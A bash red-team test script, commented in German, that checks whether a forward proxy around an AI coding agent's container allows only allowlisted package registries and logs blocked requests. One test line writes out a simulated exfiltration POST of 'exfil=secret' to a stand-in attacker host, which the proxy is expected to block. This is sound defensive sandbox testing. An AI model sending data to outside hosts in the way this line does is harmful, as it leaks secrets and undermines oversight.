#!/usr/bin/env bash
# Red-Team A11 — Forward-Proxy Allowlist/Egress.
# Realisiert docs/design/agentic-workflow/02-forward-proxy/04-testing.md.
#
# Prueft die Tabellenfaelle aus §1: erlaubte Ziele kommen durch, alles andere wird
# geblockt (default-deny) UND ist im access.log sichtbar. Laeuft AUS dem Agenten,
# d. h. ueber dessen http(s)_proxy -> forward-proxy:3128.
#
# Voraussetzung: Stack laeuft (`docker compose up -d`), Agent ist `claude-dev-env`.
# Aufruf vom Host:   tests/redteam/test_egress.sh
set -u

SVC="${AGENT_SERVICE:-claude-dev-env}"
LOGFILE="${SQUID_ACCESS_LOG:-logs/squid/access.log}"
pass=0 fail=0

# curl im Agent-Container; nutzt dessen Proxy-Env. -s still, -S Fehler, kurze Timeouts.
agent_curl() { docker compose exec -T "$SVC" curl -sS -m 20 -o /dev/null -w '%{http_code}' "$@" 2>/dev/null; }

# check NAME EXPECT(allow|deny) curl-args...
check() {
  local name="$1" expect="$2"; shift 2
  local code; code="$(agent_curl "$@")"; local rc=$?
  local ok
  if [ "$expect" = "allow" ]; then
    # erlaubt = TCP/TLS kam durch und HTTP-Status ist gesetzt (>=100), curl rc 0
    [ $rc -eq 0 ] && [ -n "$code" ] && [ "$code" -ge 100 ] 2>/dev/null && ok=1 || ok=0
  else
    # geblockt = curl scheitert (Proxy verweigert/terminiert) ODER 403/503 vom Proxy
    { [ $rc -ne 0 ] || [ "$code" = "403" ] || [ "$code" = "503" ]; } && ok=1 || ok=0
  fi
  if [ "$ok" = 1 ]; then
    printf '  \033[32mPASS\033[0m  %-48s (rc=%s code=%s)\n' "$name" "$rc" "${code:-—}"; pass=$((pass+1))
  else
    printf '  \033[31mFAIL\033[0m  %-48s (rc=%s code=%s)\n' "$name" "$rc" "${code:-—}"; fail=$((fail+1))
  fi
}

echo "== Forward-Proxy Egress-Tests (A11) =="

# --- Erlaubte Ziele (Allowlist) ---
check "HTTPS allowlisted (pypi)"        allow https://pypi.org/
check "HTTPS allowlisted (npm registry)" allow https://registry.npmjs.org/
check "HTTPS allowlisted (crates)"      allow https://static.crates.io/

# --- Geblockte Ziele ---
check "HTTPS non-allowlisted (terminate)" deny  https://example.com/
check "HTTP  non-allowlisted (deny all)"   deny  http://example.com/
check "CONNECT non-safe-port (:22)"        deny  https://github.com:22/
check "IP-Literal (kein dstdomain-Treffer)" deny https://1.1.1.1/
check "Exfil-POST nicht-allowlisted"       deny  -X POST --data exfil=secret https://attacker.example.net/

# --- Nachweis: Block taucht im Audit-Log auf ---
echo "== Audit-Log =="
if [ -f "$LOGFILE" ]; then
  if grep -Eq 'attacker\.example\.net|example\.com' "$LOGFILE"; then
    printf '  \033[32mPASS\033[0m  Block im access.log sichtbar\n'; pass=$((pass+1))
  else
    printf '  \033[31mFAIL\033[0m  Block NICHT im access.log (%s)\n' "$LOGFILE"; fail=$((fail+1))
  fi
else
  printf '  \033[33mSKIP\033[0m  %s nicht gefunden (Bind-Mount?)\n' "$LOGFILE"
fi

echo "== Ergebnis: $pass passed, $fail failed =="
[ "$fail" -eq 0 ]
